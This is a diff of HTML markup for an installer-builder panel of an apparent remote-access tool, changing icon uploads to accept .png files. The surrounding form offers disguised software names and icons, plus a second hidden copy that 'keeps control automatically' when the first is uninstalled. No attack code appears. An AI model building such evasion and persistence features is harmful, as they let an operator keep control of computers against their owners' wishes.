@@ -827,18 +827,18 @@
         <p class="build-help">Build an installer to deploy to remote machines. Label the machines with these fields and pick your installer type, then share the link or download it.</p>
         <div class="build-grid">
           <label>Software name</label><input id="b-appname" placeholder="Support" maxlength="40" />
-          <label style="display:flex;align-items:center;gap:6px">Software icon <span style="color:var(--txt3);font-weight:400;font-size:11px">(optional .ico)</span></label>
+          <label style="display:flex;align-items:center;gap:6px">Software icon <span style="color:var(--txt3);font-weight:400;font-size:11px">(optional, .ico/.png)</span></label>
           <label id="b-icon1-label" class="file-pick-btn" title="Upload a .ico file — the installer EXE will show this icon in Windows Explorer">
             <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
-            <span id="b-icon1-name">Choose .ico…</span>
-            <input id="b-icon1" type="file" accept=".ico,image/x-icon" hidden />
+            <span id="b-icon1-name">Choose icon…</span>
+            <input id="b-icon1" type="file" accept=".ico,.png,image/x-icon,image/png" hidden />
           </label>
           <label>Second software name <span style="color:var(--txt3);font-weight:400;font-size:11px">(optional)</span></label><input id="b-appname2" placeholder="Leave empty to skip" maxlength="40" title="If set, the installer registers TWO copies on the remote PC under both names. One device entry in your dashboard; when the primary copy is uninstalled, the secondary keeps control automatically." />
           <label id="b-icon2-row" style="display:none">Second software icon <span style="color:var(--txt3);font-weight:400;font-size:11px">(optional .ico)</span></label>
           <label id="b-icon2-label" class="file-pick-btn" style="display:none" title="Icon for the second copy">
             <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
-            <span id="b-icon2-name">Choose .ico…</span>
-            <input id="b-icon2" type="file" accept=".ico,image/x-icon" hidden />
+            <span id="b-icon2-name">Choose icon…</span>
+            <input id="b-icon2" type="file" accept=".ico,.png,image/x-icon,image/png" hidden />
           </label>
           <label>Name</label><select id="b-name"><option value="machine">Use Machine Name</option></select>
           <label>Company</label><input id="b-company" placeholder="e.g. Acme Corporation" />
